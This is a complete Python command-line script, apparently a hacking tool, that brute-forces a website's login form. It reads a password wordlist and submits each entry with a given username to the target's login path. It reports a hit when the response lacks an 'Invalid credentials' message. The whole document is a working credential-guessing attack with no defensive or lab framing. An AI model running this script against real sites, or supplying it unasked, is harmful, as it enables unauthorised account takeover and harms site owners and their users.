import requests
import argparse
from urllib.parse import urljoin

def brute_force_login(base_url, username, password_list):
    login_url = urljoin(base_url, "login")  # Adjust path if necessary
    with open(password_list, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        print(f"Trying password: {password}")
        response = requests.post(login_url, data={"username": username, "password": password})

        if response.status_code == 200 and "Invalid credentials" not in response.text:  # Adjust logic as needed
            print(f"[SUCCESS] Password found: {password}")
            return password

    print("Brute force complete. No valid password found.")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Login page brute forcer.")
    parser.add_argument("-u", "--url", required=True, help="Base URL of the target site (e.g., https://example.com/)")
    parser.add_argument("--username", required=True, help="Username for the login.")
    parser.add_argument("-P", "--passwordlist", required=True, help="Path to the password list file.")

    args = parser.parse_args()

    brute_force_login(args.url, args.username, args.passwordlist)
